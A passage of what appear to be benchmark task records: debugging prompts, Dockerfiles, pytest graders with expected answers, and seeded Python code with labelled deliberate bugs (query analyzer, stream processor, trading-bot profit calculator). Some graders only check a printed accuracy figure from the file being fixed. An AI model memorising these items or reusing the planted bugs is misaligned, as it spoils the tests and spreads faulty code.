result:\n                        self.results[filepath] = result\n        \n        return self.results\n    \n    def generate_report(self, output_file):\n        report = {\n            'total_files': len(self.results),\n            'files': {}\n        }\n        \n        for filepath, data in self.results.items():\n            report['files'][filepath] = {\n                'lines': data['total_lines'],\n                'functions': len(data['functions']),\n                'classes': len(data['classes']),\n                'complexity': self.calculate_complexity(data)\n            }\n        \n        # Bug: Missing comma causes invalid JSON\n        with open(output_file, 'w') as f:\n            f.write('{\\n')\n            f.write(f'  \""total_files\"": {report[\""total_files\""]}\\n')  # Missing comma here\n            f.write('  \""files\"": {\\n')\n            for i, (fp, d) in enumerate(report['files'].items()):\n                f.write(f'    \""{fp}\"": {json.dumps(d)}')\n                if i < len(report['files']) - 1:\n                    f.write(',')\n                f.write('\\n')\n            f.write('  }\\n')\n            f.write('}\\n')\n    \n    def calculate_complexity(self, data):\n        # Bug: This doesn't actually calculate cyclomatic complexity\n        return len(data['functions']) + len(data['classes'])\n\n\nclass ComplexityVisitor(ast.NodeVisitor):\n    def __init__(self):\n        self.functions = []\n        self.classes = []\n        self.complexity = 1\n    \n    def visit_FunctionDef(self, node):\n        self.functions.append(node.name)\n        # Should calculate complexity here but doesn't\n        self.generic_visit(node)\n    \n    def visit_ClassDef(self, node):\n        self.classes.append(node.name)\n        self.generic_visit(node)\n    \n    def visit_If(self, node):\n        # Should increment complexity but doesn't\n        self.generic_visit(node)\n    \n    def visit_While(self, node):\n        # Should increment complexity but doesn't\n        self.generic_visit(node)\n    \n    def visit_For(self, node):\n        # Should increment complexity but doesn't\n        self.generic_visit(node)\n\n\nif __name__ == '__main__':\n    analyzer = ComplexityAnalyzer()\n    results = analyzer.analyze_directory('/app/codebase')\n    analyzer.generate_report('complexity_report.json')\n    print(f\""Analysis complete. Found {len(results)} Python files.\"")"", ""codebase/data_processor.py"": ""import json\nimport csv\n\nclass DataProcessor:\n    def __init__(self):\n        self.data = []\n    \n    def load_json(self, filepath):\n        with open(filepath, 'r') as f:\n            self.data = json.load(f)\n    \n    def load_csv(self, filepath):\n        with open(filepath, 'r') as f:\n            reader = csv.DictReader(f)\n            self.data = list(reader)\n    \n    def filter_data(self, key, value):\n        filtered = []\n        for item in self.data:\n            if key in item and item[key] == value:\n                filtered.append(item)\n        return filtered\n    \n    def transform_data(self, transformations):\n        for item in self.data:\n            for field, transform in transformations.items():\n                if field in item:\n                    if transform == 'uppercase':\n                        item[field] = item[field].upper()\n                    elif transform == 'lowercase':\n                        item[field] = item[field].lower()\n                    elif transform == 'int':\n                        try:\n                            item[field] = int(item[field])\n                        except:\n                            pass\n    \n    def aggregate_data(self, group_by, aggregate_field, operation='sum'):\n        groups = {}\n        for item in self.data:\n            if group_by in item:\n                key = item[group_by]\n                if key not in groups:\n                    groups[key] = []\n                if aggregate_field in item:\n                    try:\n                        groups[key].append(float(item[aggregate_field]))\n                    except:\n                        pass\n        \n        results = {}\n        for key, values in groups.items():\n            if operation == 'sum':\n                results[key] = sum(values)\n            elif operation == 'avg':\n                results[key] = sum(values) / len(values) if values else 0\n            elif operation == 'max':\n                results[key] = max(values) if values else 0\n            elif operation == 'min':\n                results[key] = min(values) if values else 0\n        \n        return results\n\ndef process_batch(files, output_format='json'):\n    processor = DataProcessor()\n    all_results = []\n    \n    for file in files:\n        if file.endswith('.json'):\n            processor.load_json(file)\n        elif file.endswith('.csv'):\n            processor.load_csv(file)\n        \n        result = {\n            'file': file,\n            'count': len(processor.data),\n            'data': processor.data\n        }\n        all_results.append(result)\n    \n    if output_format == 'json':\n        return json.dumps(all_results, indent=2)\n    else:\n        return str(all_results)"", ""codebase/utils.py"": ""def calculate_factorial(n):\n    if n == 0:\n        return 1\n    elif n < 0:\n        raise ValueError(\""Negative numbers not supported\"")\n    else:\n        result = 1\n        for i in range(1, n + 1):\n            result *= i\n        return result\n\ndef is_prime(num):\n    if num < 2:\n        return False\n    for i in range(2, int(num**0.5) + 1):\n        if num % i == 0:\n            return False\n    return True\n\ndef fibonacci(n):\n    if n <= 0:\n        return []\n    elif n == 1:\n        return [0]\n    elif n == 2:\n        return [0, 1]\n    else:\n        fib = [0, 1]\n        while len(fib) < n:\n            fib.append(fib[-1] + fib[-2])\n        return fib\n\nclass MathOperations:\n    def add(self, a, b):\n        return a + b\n    \n    def subtract(self, a, b):\n        return a - b\n    \n    def multiply(self, a, b):\n        return a * b\n    \n    def divide(self, a, b):\n        if b == 0:\n            raise ZeroDivisionError(\""Cannot divide by zero\"")\n        return a / b""}",2025-07-21T16:53:38.353447,2025-07-21T16:53:38.353447
draft_dp_735312cb,extremely_hard,draft_dp_735312cb,debugging,The query analyzer is reporting incorrect optimization scores. Fix it to properly identify queries with >10:1 examined/returned ratio and missing index usage.,debugging,python|debugging|data-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install sqlparse

COPY query_analyzer.py /app/
COPY queries.json /app/

RUN chmod +x /app/query_analyzer.py

CMD [""/bin/bash""]","import subprocess
import json

def test_high_ratio_queries_identified():
    """"""Test that queries with >10:1 examined/returned ratio are properly identified.""""""
    
    # Run the analyzer
    result = subprocess.run(
        ['python', '/app/query_analyzer.py', '/app/queries.json', '--format', 'json'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Script failed with error: {result.stderr}""
    
    output = json.loads(result.stdout)
    high_ratio_queries = output['high_ratio_queries']
    
    # Get query IDs that should be found (>10:1 ratio)
    expected_queries = {'q001', 'q004', 'q008', 'q011', 'q014', 'q015', 'q017', 'q019'}
    found_queries = {q['query_id'] for q in high_ratio_queries}
    
    # Check that all expected queries are found
    missing = expected_queries - found_queries
    assert len(missing) == 0, f""Failed to identify high ratio queries: {missing}""
    
    # Verify ratios are correct
    for q in high_ratio_queries:
        if q['query_id'] in expected_queries:
            ratio = q['rows_examined'] / q['rows_returned']
            assert ratio > 10, f""Query {q['query_id']} has ratio {ratio:.1f}, expected >10""

def test_missing_index_detection():
    """"""Test that queries without index usage are detected.""""""
    
    # Run the analyzer
    result = subprocess.run(
        ['python', '/app/query_analyzer.py', '/app/queries.json', '--format', 'json'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Script failed with error: {result.stderr}""
    
    output = json.loads(result.stdout)
    missing_index_queries = output['missing_index_queries']
    
    # Get query IDs that should be found (no indexes used)
    expected_queries = {'q001', 'q004', 'q005', 'q008', 'q011', 'q014', 'q015', 'q017', 'q019'}
    found_queries = {q['query_id'] for q in missing_index_queries}
    
    # Check that all expected queries are found
    missing = expected_queries - found_queries
    assert len(missing) == 0, f""Failed to identify queries missing indexes: {missing}""
    
    # Verify these queries actually have no indexes
    for q in missing_index_queries:
        assert q['query_id'] in expected_queries, f""Query {q['query_id']} should not be in missing index list""","{""test_high_ratio_queries_identified"": 0.6, ""test_missing_index_detection"": 0.4}","{""query_analyzer.py"": ""#!/usr/bin/env python3\nimport json\nimport argparse\nimport sqlparse\nfrom pathlib import Path\nfrom typing import Dict, List, Tuple\n\nclass QueryAnalyzer:\n    def __init__(self, queries_path: str):\n        self.queries_path = Path(queries_path)\n        self.queries_data = self._load_queries()\n    \n    def _load_queries(self) -> List[Dict]:\n        with open(self.queries_path, 'r') as f:\n            return json.load(f)\n    \n    def calculate_optimization_score(self, query_stats: Dict) -> float:\n        rows_examined = query_stats.get('rows_examined', 0)\n        rows_returned = query_stats.get('rows_returned', 1)\n        \n        # BUG: Incorrect ratio calculation - dividing returned by examined instead of examined by returned\n        if rows_returned > 0:\n            ratio = rows_returned / rows_examined\n        else:\n            ratio = 0\n        \n        # Index usage check\n        indexes_used = query_stats.get('indexes_used', [])\n        index_penalty = 0 if indexes_used else 20\n        \n        # Calculate score (higher is worse)\n        score = ratio * 10 + index_penalty\n        return score\n    \n    def find_high_ratio_queries(self, threshold: float = 10.0) -> List[Dict]:\n        results = []\n        \n        for query in self.queries_data:\n            stats = query.get('stats', {})\n            rows_examined = stats.get('rows_examined', 0)\n            rows_returned = stats.get('rows_returned', 1)\n            \n            # BUG: Using wrong comparison - should be > threshold not < threshold\n            if rows_examined > 0 and rows_returned > 0:\n                ratio = rows_examined / rows_returned\n                if ratio < threshold:\n                    results.append({\n                        'query_id': query['id'],\n                        'query': query['query'],\n                        'ratio': ratio,\n                        'rows_examined': rows_examined,\n                        'rows_returned': rows_returned\n                    })\n        \n        return results\n    \n    def find_missing_index_queries(self) -> List[Dict]:\n        results = []\n        \n        for query in self.queries_data:\n            stats = query.get('stats', {})\n            # BUG: Checking if indexes_used exists, not if it's empty\n            if 'indexes_used' in stats:\n                continue\n            \n            results.append({\n                'query_id': query['id'],\n                'query': query['query'],\n                'table_scanned': stats.get('table_scanned', 'unknown'),\n                'rows_examined': stats.get('rows_examined', 0)\n            })\n        \n        return results\n    \n    def analyze_all(self) -> Dict:\n        high_ratio = self.find_high_ratio_queries()\n        missing_indexes = self.find_missing_index_queries()\n        \n        all_scores = []\n        for query in self.queries_data:\n            score = self.calculate_optimization_score(query.get('stats', {}))\n            all_scores.append({\n                'query_id': query['id'],\n                'score': score,\n                'query': query['query'][:50] + '...' if len(query['query']) > 50 else query['query']\n            })\n        \n        # Sort by score (higher = needs more optimization)\n        all_scores.sort(key=lambda x: x['score'], reverse=True)\n        \n        return {\n            'high_ratio_queries': high_ratio,\n            'missing_index_queries': missing_indexes,\n            'top_optimization_candidates': all_scores[:10]\n        }\n\ndef main():\n    parser = argparse.ArgumentParser(description='Analyze SQL query performance')\n    parser.add_argument('queries_file', help='Path to JSON file with query data')\n    parser.add_argument('--ratio-threshold', type=float, default=10.0,\n                        help='Threshold for examined/returned ratio (default: 10.0)')\n    parser.add_argument('--format', choices=['json', 'text'], default='text',\n                        help='Output format')\n    \n    args = parser.parse_args()\n    \n    analyzer = QueryAnalyzer(args.queries_file)\n    results = analyzer.analyze_all()\n    \n    if args.format == 'json':\n        print(json.dumps(results, indent=2))\n    else:\n        print(\""=== Query Performance Analysis ===\\n\"")\n        \n        print(f\""High Ratio Queries (>{args.ratio_threshold}:1 examined/returned):\"")\n        print(f\""Found: {len(results['high_ratio_queries'])}\"")\n        for q in results['high_ratio_queries'][:5]:\n            print(f\""  - Query {q['query_id']}: {q['ratio']:.1f}:1 ratio\"")\n            print(f\""    {q['query'][:60]}...\"")\n        \n        print(f\""\\nMissing Index Queries:\"")\n        print(f\""Found: {len(results['missing_index_queries'])}\"")\n        for q in results['missing_index_queries'][:5]:\n            print(f\""  - Query {q['query_id']}: {q['rows_examined']} rows examined\"")\n            print(f\""    {q['query'][:60]}...\"")\n        \n        print(f\""\\nTop Optimization Candidates:\"")\n        for q in results['top_optimization_candidates'][:5]:\n            print(f\""  - Query {q['query_id']}: score={q['score']:.2f}\"")\n            print(f\""    {q['query']}\"")\n\nif __name__ == '__main__':\n    main()"", ""queries.json"": ""[\n  {\n    \""id\"": \""q001\"",\n    \""query\"": \""SELECT * FROM users WHERE email = 'john@example.com'\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 250,\n      \""rows_examined\"": 50000,\n      \""rows_returned\"": 1,\n      \""indexes_used\"": [],\n      \""table_scanned\"": \""users\""\n    }\n  },\n  {\n    \""id\"": \""q002\"",\n    \""query\"": \""SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id WHERE o.created_at > '2024-01-01'\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 1200,\n      \""rows_examined\"": 120000,\n      \""rows_returned\"": 8500,\n      \""indexes_used\"": [\""idx_orders_created_at\""],\n      \""table_scanned\"": \""users\""\n    }\n  },\n  {\n    \""id\"": \""q003\"",\n    \""query\"": \""SELECT COUNT(*) FROM products WHERE category_id = 5\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 50,\n      \""rows_examined\"": 200,\n      \""rows_returned\"": 1,\n      \""indexes_used\"": [\""idx_products_category\""],\n      \""table_scanned\"": null\n    }\n  },\n  {\n    \""id\"": \""q004\"",\n    \""query\"": \""SELECT p.name, p.price FROM products p WHERE p.status = 'active' ORDER BY p.created_at DESC LIMIT 10\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 800,\n      \""rows_examined\"": 75000,\n      \""rows_returned\"": 10,\n      \""indexes_used\"": [],\n      \""table_scanned\"": \""products\""\n    }\n  },\n  {\n    \""id\"": \""q005\"",\n    \""query\"": \""SELECT customer_id, SUM(amount) as total FROM transactions GROUP BY customer_id HAVING total > 1000\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 3500,\n      \""rows_examined\"": 500000,\n      \""rows_returned\"": 2500,\n      \""indexes_used\"": [],\n      \""table_scanned\"": \""transactions\""\n    }\n  },\n  {\n    \""id\"": \""q006\"",\n    \""query\"": \""SELECT id, name FROM categories WHERE parent_id IS NULL\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 15,\n      \""rows_examined\"": 50,\n      \""rows_returned\"": 12,\n      \""indexes_used\"": [\""idx_categories_parent\""],\n      \""table_scanned\"": null\n    }\n  },\n  {\n    \""id\"": \""q007\"",\n    \""query\"": \""SELECT u.email, COUNT(l.id) as login_count FROM users u LEFT JOIN login_history l ON u.id = l.user_id WHERE l.created_at > DATE_SUB(NOW(), INTERVAL 30 DAY) GROUP BY u.id\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 2200,\n      \""rows_examined\"": 180000,\n      \""rows_returned\"": 15000,\n      \""indexes_used\"": [\""idx_login_history_created_at\""],\n      \""table_scanned\"": \""users\""\n    }\n  },\n  {\n    \""id\"": \""q008\"",\n    \""query\"": \""SELECT * FROM inventory WHERE quantity < reorder_level AND supplier_id = 42\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 450,\n      \""rows_examined\"": 25000,\n      \""rows_returned\"": 15,\n      \""indexes_used\"": [],\n      \""table_scanned\"": \""inventory\""\n    }\n  },\n  {\n    \""id\"": \""q009\"",\n    \""query\"": \""SELECT DISTINCT city FROM addresses WHERE country = 'USA'\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 1800,\n      \""rows_examined\"": 300000,\n      \""rows_returned\"": 5000,\n      \""indexes_used\"": [\""idx_addresses_country\""],\n      \""table_scanned\"": null\n    }\n  },\n  {\n    \""id\"": \""q010\"",\n    \""query\"": \""SELECT o.id, o.status, SUM(oi.quantity * oi.price) as total FROM orders o JOIN order_items oi ON o.id = oi.order_id WHERE o.customer_id = 12345 GROUP BY o.id\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 120,\n      \""rows_examined\"": 150,\n      \""rows_returned\"": 25,\n      \""indexes_used\"": [\""idx_orders_customer\"", \""idx_order_items_order\""],\n      \""table_scanned\"": null\n    }\n  },\n  {\n    \""id\"": \""q011\"",\n    \""query\"": \""SELECT * FROM logs WHERE level = 'ERROR' AND timestamp > '2024-03-01'\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 5500,\n      \""rows_examined\"": 2000000,\n      \""rows_returned\"": 500,\n      \""indexes_used\"": [],\n      \""table_scanned\"": \""logs\""\n    }\n  },\n  {\n    \""id\"": \""q012\"",\n    \""query\"": \""SELECT p.id, p.name, AVG(r.rating) as avg_rating FROM products p JOIN reviews r ON p.id = r.product_id GROUP BY p.id HAVING avg_rating > 4.0\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 1100,\n      \""rows_examined\"": 80000,\n      \""rows_returned\"": 3500,\n      \""indexes_used\"": [\""idx_reviews_product\""],\n      \""table_scanned\"": null\n    }\n  },\n  {\n    \""id\"": \""q013\"",\n    \""query\"": \""SELECT employee_id, department_id FROM employees WHERE hire_date < '2020-01-01' AND status = 'active'\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 350,\n      \""rows_examined\"": 15000,\n      \""rows_returned\"": 8500,\n      \""indexes_used\"": [\""idx_employees_hire_date\""],\n      \""table_scanned\"": null\n    }\n  },\n  {\n    \""id\"": \""q014\"",\n    \""query\"": \""SELECT * FROM payment_methods WHERE user_id = 99999 AND is_default = 1\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 180,\n      \""rows_examined\"": 12000,\n      \""rows_returned\"": 1,\n      \""indexes_used\"": [],\n      \""table_scanned\"": \""payment_methods\""\n    }\n  },\n  {\n    \""id\"": \""q015\"",\n    \""query\"": \""SELECT tag_name, COUNT(*) as usage_count FROM post_tags GROUP BY tag_name ORDER BY usage_count DESC LIMIT 20\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 900,\n      \""rows_examined\"": 450000,\n      \""rows_returned\"": 20,\n      \""indexes_used\"": [],\n      \""table_scanned\"": \""post_tags\""\n    }\n  },\n  {\n    \""id\"": \""q016\"",\n    \""query\"": \""SELECT s.id, s.name, s.stock_level FROM suppliers s WHERE s.country = 'China' AND s.active = 1\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 75,\n      \""rows_examined\"": 500,\n      \""rows_returned\"": 120,\n      \""indexes_used\"": [\""idx_suppliers_country_active\""],\n      \""table_scanned\"": null\n    }\n  },\n  {\n    \""id\"": \""q017\"",\n    \""query\"": \""SELECT message_id, sender_id, recipient_id, sent_at FROM messages WHERE recipient_id = 5555 AND read_status = 0\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 420,\n      \""rows_examined\"": 35000,\n      \""rows_returned\"": 42,\n      \""indexes_used\"": [],\n      \""table_scanned\"": \""messages\""\n    }\n  },\n  {\n    \""id\"": \""q018\"",\n    \""query\"": \""SELECT c.name, COUNT(s.id) as sale_count FROM campaigns c LEFT JOIN sales s ON c.id = s.campaign_id WHERE c.start_date > '2024-01-01' GROUP BY c.id\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 650,\n      \""rows_examined\"": 25000,\n      \""rows_returned\"": 150,\n      \""indexes_used\"": [\""idx_campaigns_start_date\"", \""idx_sales_campaign\""],\n      \""table_scanned\"": null\n    }\n  },\n  {\n    \""id\"": \""q019\"",\n    \""query\"": \""SELECT * FROM audit_log WHERE table_name = 'users' AND action = 'UPDATE' AND created_at > DATE_SUB(NOW(), INTERVAL 7 DAY)\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 3200,\n      \""rows_examined\"": 800000,\n      \""rows_returned\"": 250,\n      \""indexes_used\"": [],\n      \""table_scanned\"": \""audit_log\""\n    }\n  },\n  {\n    \""id\"": \""q020\"",\n    \""query\"": \""SELECT p.id, p.title, p.view_count FROM posts p WHERE p.published = 1 AND p.category_id IN (1,2,3,4,5) ORDER BY p.view_count DESC LIMIT 100\"",\n    \""stats\"": {\n      \""execution_time_ms\"": 280,\n      \""rows_examined\"": 15000,\n      \""rows_returned\"": 100,\n      \""indexes_used\"": [\""idx_posts_published_category\""],\n      \""table_scanned\"": null\n    }\n  }\n]""}",2025-07-21T16:54:46.558915,2025-07-21T16:54:46.558915
draft_dp_f6d19401,medium,draft_dp_f6d19401,data-processing,The stream processor is showing 68% accuracy for window aggregations. Need to fix it to get >99% accuracy - run `python test_accuracy.py` to see current accuracy.,data-processing,python|debugging|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install dependencies
RUN pip install kafka-python pandas numpy

# Copy application files
COPY stream_processor.py /app/
COPY test_accuracy.py /app/
COPY sensor_data.csv /app/

CMD [""bash""]","import subprocess
import os
import sys

def test_window_aggregation_accuracy():
    """"""Test that the stream processor achieves >99% accuracy""""""
    # Run the accuracy test
    result = subprocess.run(
        [sys.executable, '/app/test_accuracy.py'],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    
    assert result.returncode == 0, f""Test script failed: {result.stderr}""
    
    # Check for accuracy in output
    output = result.stdout
    assert ""Window Aggregation Accuracy:"" in output, ""No accuracy result found""
    
    # Extract accuracy percentage
    for line in output.split('\n'):
        if ""Window Aggregation Accuracy:"" in line:
            accuracy_str = line.split(':')[1].strip().rstrip('%')
            accuracy = float(accuracy_str)
            assert accuracy > 99.0, f""Accuracy {accuracy}% is below required 99%""
            break
    else:
        assert False, ""Could not parse accuracy from output""","{""test_window_aggregation_accuracy"": 1.0}","{""sensor_data.csv"": ""timestamp,sensor_id,value\n2025-01-15 10:00:00,sensor_0,52.3\n2025-01-15 10:00:01,sensor_1,51.8\n2025-01-15 10:00:02,sensor_2,53.1"", ""stream_processor.py"": ""import pandas as pd\nimport numpy as np\nfrom datetime import datetime, timedelta\nfrom collections import deque\nimport time\n\nclass StreamProcessor:\n    def __init__(self, window_size_seconds=60, slide_interval_seconds=10):\n        self.window_size = window_size_seconds\n        self.slide_interval = slide_interval_seconds\n        self.windows = {}\n        self.processed_count = 0\n        \n    def process_record(self, timestamp, sensor_id, value):\n        # BUG: Using current time instead of event timestamp for window assignment\n        current_time = datetime.now()\n        \n        # Calculate which windows this record belongs to\n        window_start = current_time - timedelta(seconds=current_time.timestamp() % self.slide_interval)\n        \n        # Add to all applicable windows\n        for i in range(int(self.window_size / self.slide_interval)):\n            window_key = window_start - timedelta(seconds=i * self.slide_interval)\n            if window_key not in self.windows:\n                self.windows[window_key] = []\n            \n            # Only keep data within window\n            window_end = window_key + timedelta(seconds=self.window_size)\n            if current_time <= window_end:\n                self.windows[window_key].append({\n                    'timestamp': timestamp,\n                    'sensor_id': sensor_id,\n                    'value': value\n                })\n        \n        self.processed_count += 1\n        \n        # Clean old windows\n        cutoff = current_time - timedelta(seconds=self.window_size * 2)\n        self.windows = {k: v for k, v in self.windows.items() if k > cutoff}\n    \n    def get_window_aggregates(self):\n        results = []\n        for window_start, records in self.windows.items():\n            if records:\n                window_end = window_start + timedelta(seconds=self.window_size)\n                avg_value = np.mean([r['value'] for r in records])\n                results.append({\n                    'window_start': window_start,\n                    'window_end': window_end,\n                    'avg_value': avg_value,\n                    'count': len(records)\n                })\n        return sorted(results, key=lambda x: x['window_start'])\n    \n    def process_batch(self, df):\n        for _, row in df.iterrows():\n            self.process_record(row['timestamp'], row['sensor_id'], row['value'])\n            # Simulate streaming delay\n            time.sleep(0.001)\n        \n        return self.get_window_aggregates()\n\ndef calculate_ground_truth(df, window_size_seconds=60, slide_interval_seconds=10):\n    df = df.copy()\n    df['timestamp'] = pd.to_datetime(df['timestamp'])\n    df = df.sort_values('timestamp')\n    \n    results = []\n    start_time = df['timestamp'].min()\n    end_time = df['timestamp'].max()\n    \n    current_window = start_time\n    while current_window <= end_time:\n        window_end = current_window + timedelta(seconds=window_size_seconds)\n        window_data = df[(df['timestamp'] >= current_window) & (df['timestamp'] < window_end)]\n        \n        if not window_data.empty:\n            results.append({\n                'window_start': current_window,\n                'window_end': window_end,\n                'avg_value': window_data['value'].mean(),\n                'count': len(window_data)\n            })\n        \n        current_window += timedelta(seconds=slide_interval_seconds)\n    \n    return results"", ""test_accuracy.py"": ""import pandas as pd\nimport numpy as np\nfrom datetime import datetime, timedelta\nfrom stream_processor import StreamProcessor, calculate_ground_truth\n\ndef generate_test_data():\n    # Generate synthetic sensor data\n    np.random.seed(42)\n    start_time = datetime.now() - timedelta(minutes=10)\n    \n    data = []\n    for i in range(1000):\n        timestamp = start_time + timedelta(seconds=i * 0.5)\n        sensor_id = f\""sensor_{i % 5}\""\n        value = 50 + 10 * np.sin(i / 100) + np.random.normal(0, 2)\n        data.append({\n            'timestamp': timestamp,\n            'sensor_id': sensor_id,\n            'value': value\n        })\n    \n    df = pd.DataFrame(data)\n    df.to_csv('sensor_data.csv', index=False)\n    return df\n\ndef calculate_accuracy(streaming_results, ground_truth):\n    if not streaming_results or not ground_truth:\n        return 0.0\n    \n    # Match windows and calculate accuracy\n    matches = 0\n    total = 0\n    \n    for gt in ground_truth:\n        for sr in streaming_results:\n            # Find matching window (within 1 second tolerance)\n            if abs((sr['window_start'] - gt['window_start']).total_seconds()) < 1:\n                # Check if aggregated values are close\n                if abs(sr['avg_value'] - gt['avg_value']) < 0.1:\n                    matches += 1\n                total += 1\n                break\n    \n    if total == 0:\n        return 0.0\n    \n    return (matches / total) * 100\n\ndef main():\n    print(\""Generating test data...\"")\n    df = generate_test_data()\n    \n    print(\""Processing stream...\"")\n    processor = StreamProcessor(window_size_seconds=60, slide_interval_seconds=10)\n    streaming_results = processor.process_batch(df)\n    \n    print(\""Calculating ground truth...\"")\n    ground_truth = calculate_ground_truth(df, window_size_seconds=60, slide_interval_seconds=10)\n    \n    accuracy = calculate_accuracy(streaming_results, ground_truth)\n    print(f\""\\nWindow Aggregation Accuracy: {accuracy:.1f}%\"")\n    \n    if accuracy > 99:\n        print(\""\u2713 Accuracy target achieved!\"")\n    else:\n        print(\""\u2717 Accuracy below target (need >99%)\"")\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-21T16:59:26.958582,2025-07-21T16:59:26.958582
draft_dp_8f127273,hard,draft_dp_8f127273,debugging,The crypto bot's profit calculations are wrong - showing 43% accuracy vs manual checks. Fix the calculation logic in trading_bot.py to get >99% accuracy.,debugging,python|debugging|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas numpy

COPY trading_bot.py /app/
COPY trade_data.json /app/

RUN chmod +x /app/trading_bot.py

CMD [""/bin/bash""]","import subprocess
import json

def test_profit_calculation_accuracy():
    """"""Test that the trading bot achieves >99% profit calculation accuracy.""""""
    result = subprocess.run(
        ['python', '/app/trading_bot.py'],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    
    assert result.returncode == 0, f""Trading bot failed to run: {result.stderr}""
    
    # Extract accuracy from output
    output_lines = result.stdout.strip().split('\n')
    accuracy_line = None
    for line in output_lines:
        if ""Profit Calculation Accuracy:"" in line:
            accuracy_line = line
            break
    
    assert accuracy_line is not None, ""No accuracy output found""
    
    # Parse accuracy percentage
    accuracy_str = accuracy_line.split("": "")[1].replace(""%"", """")
    accuracy = float(accuracy_str)
    
    assert accuracy > 99.0, f""Accuracy {accuracy}% is not greater than 99%""","{""test_profit_calculation_accuracy"": 1.0}","{""trading_bot.py"": ""#!/usr/bin/env python3\nimport pandas as pd\nimport numpy as np\nfrom decimal import Decimal, getcontext\nimport json\nimport asyncio\nfrom typing import Dict, List, Tuple\nimport os\n\ngetcontext().prec = 28\n\nclass ArbitrageTradingBot:\n    def __init__(self):\n        self.exchanges = ['binance', 'kraken', 'coinbase']\n        self.fee_schedules = {\n            'binance': {'maker': 0.001, 'taker': 0.001, 'withdrawal': 0.0005},\n            'kraken': {'maker': 0.0016, 'taker': 0.0026, 'withdrawal': 0.0005},\n            'coinbase': {'maker': 0.005, 'taker': 0.005, 'withdrawal': 0.0008}\n        }\n        self.trades = []\n        self.ground_truth_profits = []\n        \n    def load_historical_data(self):\n        with open('/app/trade_data.json', 'r') as f:\n            data = json.load(f)\n        self.trades = data['trades']\n        self.ground_truth_profits = data['ground_truth_profits']\n        \n    def calculate_trade_profit(self, trade: Dict) -> Decimal:\n        buy_exchange = trade['buy_exchange']\n        sell_exchange = trade['sell_exchange']\n        \n        buy_amount = Decimal(str(trade['buy_amount']))\n        buy_price = Decimal(str(trade['buy_price']))\n        sell_price = Decimal(str(trade['sell_price']))\n        \n        # Calculate buy cost\n        buy_cost = buy_amount * buy_price\n        \n        # Apply buy exchange fees\n        if trade['buy_type'] == 'market':\n            buy_fee = buy_cost * Decimal(str(self.fee_schedules[buy_exchange]['taker']))\n        else:\n            buy_fee = buy_cost * Decimal(str(self.fee_schedules[buy_exchange]['maker']))\n        \n        total_buy_cost = buy_cost + buy_fee\n        \n        # Apply withdrawal fee from buy exchange\n        withdrawal_fee = Decimal(str(self.fee_schedules[buy_exchange]['withdrawal']))\n        amount_after_withdrawal = buy_amount - withdrawal_fee\n        \n        # Calculate sell revenue\n        sell_revenue = amount_after_withdrawal * sell_price\n        \n        # Apply sell exchange fees\n        if trade['sell_type'] == 'market':\n            sell_fee = sell_revenue * Decimal(str(self.fee_schedules[sell_exchange]['taker']))\n        else:\n            sell_fee = sell_revenue * Decimal(str(self.fee_schedules[sell_exchange]['maker']))\n        \n        net_sell_revenue = sell_revenue - sell_fee\n        \n        # Calculate profit\n        profit = net_sell_revenue - total_buy_cost\n        \n        # Apply slippage if present\n        if 'slippage' in trade:\n            slippage = Decimal(str(trade['slippage']))\n            profit = profit * (Decimal('1') - slippage)\n        \n        return profit\n    \n    def run_backtesting(self):\n        self.load_historical_data()\n        calculated_profits = []\n        \n        for trade in self.trades:\n            profit = self.calculate_trade_profit(trade)\n            calculated_profits.append(float(profit))\n        \n        # Compare with ground truth\n        correct_calculations = 0\n        for i, (calc, truth) in enumerate(zip(calculated_profits, self.ground_truth_profits)):\n            # Allow for small rounding differences\n            if abs(calc - truth) < 0.01:\n                correct_calculations += 1\n        \n        accuracy = (correct_calculations / len(self.trades)) * 100\n        print(f\""Profit Calculation Accuracy: {accuracy:.1f}%\"")\n        \n        return accuracy\n\nasync def main():\n    bot = ArbitrageTradingBot()\n    accuracy = bot.run_backtesting()\n    return accuracy\n\nif __name__ == \""__main__\"":\n    asyncio.run(main())"", ""trade_data.json"": ""{\n  \""trades\"": [\n    {\n      \""id\"": 1,\n      \""buy_exchange\"": \""binance\"",\n      \""sell_exchange\"": \""kraken\"",\n      \""buy_amount\"": 1.0,\n      \""buy_price\"": 40000.0,\n      \""sell_price\"": 40100.0,\n      \""buy_type\"": \""limit\"",\n      \""sell_type\"": \""market\"",\n      \""slippage\"": 0.0001\n    },\n    {\n      \""id\"": 2,\n      \""buy_exchange\"": \""kraken\"",\n      \""sell_exchange\"": \""coinbase\"",\n      \""buy_amount\"": 0.5,\n      \""buy_price\"": 41000.0,\n      \""sell_price\"": 41200.0,\n      \""buy_type\"": \""market\"",\n      \""sell_type\"": \""limit\""\n    },\n    {\n      \""id\"": 3,\n      \""buy_exchange\"": \""coinbase\"",\n      \""sell_exchange\"": \""binance\"",\n      \""buy_amount\"": 2.5,\n      \""buy_price\"": 39500.0,\n      \""sell_price\"": 39600.0,\n      \""buy_type\"": \""limit\"",\n      